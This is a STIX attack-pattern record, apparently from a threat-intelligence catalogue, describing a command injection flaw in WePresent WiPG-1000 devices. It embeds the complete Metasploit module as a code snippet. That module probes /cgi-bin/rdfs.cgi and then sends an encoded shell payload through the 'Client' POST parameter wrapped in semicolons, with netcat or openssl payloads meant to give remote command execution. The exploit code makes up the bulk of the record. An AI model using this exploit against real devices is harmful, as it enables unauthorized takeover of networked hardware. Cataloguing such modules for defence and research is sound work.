{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6bcac290-e9cf-4483-8d2d-2b52609629bd",
    "created": "2024-08-14T17:01:17.15609Z",
    "modified": "2024-08-14T17:01:17.156094Z",
    "name": "WePresent WiPG-1000 Command Injection",
    "description": " This module exploits a command injection vulnerability in an undocumented CGI file in several versions of the WePresent WiPG-1000 devices. Version 2.0.0.7 was confirmed vulnerable, 2.2.3.0 patched this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/wipg1000_cmd_injection.rb",
            "external_id": "wipg1000_cmd_injection.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.redguard.ch/advisories/wepresent-wipg1000.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'WePresent WiPG-1000 Command Injection',\n      'Description'    => %q{\n        This module exploits a command injection vulnerability in an undocumented\n        CGI file in several versions of the WePresent WiPG-1000 devices.\n        Version 2.0.0.7 was confirmed vulnerable, 2.2.3.0 patched this vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Matthias Brun', # Vulnerability Discovery, Metasploit Module\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'https://www.redguard.ch/advisories/wepresent-wipg1000.txt' ]\n        ],\n      'Payload'        =>\n        {\n          'Compat'     =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic netcat openssl'\n            }\n        },\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['WiPG-1000 <=2.0.0.7', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-04-20',\n      'DefaultTarget'  => 0))\n  end\n\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => '/cgi-bin/rdfs.cgi'\n    })\n    if res && res.body.include?(\"Follow administrator instructions to enter the complete path\")\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status('Sending request')\n    send_request_cgi(\n      'method' => 'POST',\n      'uri'    => '/cgi-bin/rdfs.cgi',\n      'vars_post' => {\n        'Client' => \";#{payload.encoded};\",\n        'Download' => 'Download'\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-20",
    "x_mitre_platforms": [
        "['unix']"
    ]
}